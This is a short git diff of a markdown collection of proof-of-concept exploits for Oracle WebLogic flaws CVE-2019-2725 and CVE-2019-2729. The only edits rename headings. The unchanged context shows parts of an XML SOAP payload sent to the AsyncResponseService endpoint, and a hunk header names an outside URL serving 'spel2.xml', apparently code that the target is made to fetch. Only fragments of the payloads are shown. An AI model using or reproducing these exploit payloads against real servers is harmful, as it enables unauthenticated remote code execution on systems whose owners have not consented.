@@ -1,4 +1,4 @@
-### CVE-2019-2725_v10
+### CVE-2019-2725_v10_v12
 poc:
 ```xml
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
@@ -16,7 +16,7 @@ http://cqq.com:8888/spel2.xml
 <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
 ```
 
-### CVE-2019-2729_v10
+### CVE-2019-2729_v10_v12
 
 poc:
 ```xml
